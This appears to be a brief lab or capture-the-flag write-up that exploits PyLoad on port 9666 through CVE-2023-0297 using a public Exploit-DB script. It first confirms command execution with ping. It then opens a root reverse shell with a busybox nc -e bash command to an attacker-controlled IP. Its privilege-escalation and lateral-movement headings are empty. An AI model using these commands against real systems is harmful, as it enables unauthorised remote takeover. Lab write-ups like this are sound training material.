#Pwned! 
```IP
192.168.192.26
```
# Enumeration

## HTTP 9666
PyLoad
```py
CVE-2023-0297
```


# Exploitation
We test unauthenticated remote code execution with the following exploit
https://www.exploit-db.com/exploits/51532
```
python cve-2023-0297.py -u http://192.168.192.26:9666 -c 'ping -c 5 192.168.45.204'
```
Indeed we are able to execute commands
![](https://github.com/bipbopbup/writeups/blob/main/Media/Pasted%20image%2020241205092835.png?raw=true)
```
python cve-2023-0297.py -u http://192.168.192.26:9666 -c 'busybox nc  192.168.45.204 4444 -e bash'
```
And we get a root shell inmediately
![](https://github.com/bipbopbup/writeups/blob/main/Media/Pasted%20image%2020241205093214.png?raw=true)

# PrivEsc

## Manual

## Automated

### Peass
### Mimikatz

# Lateral Movement

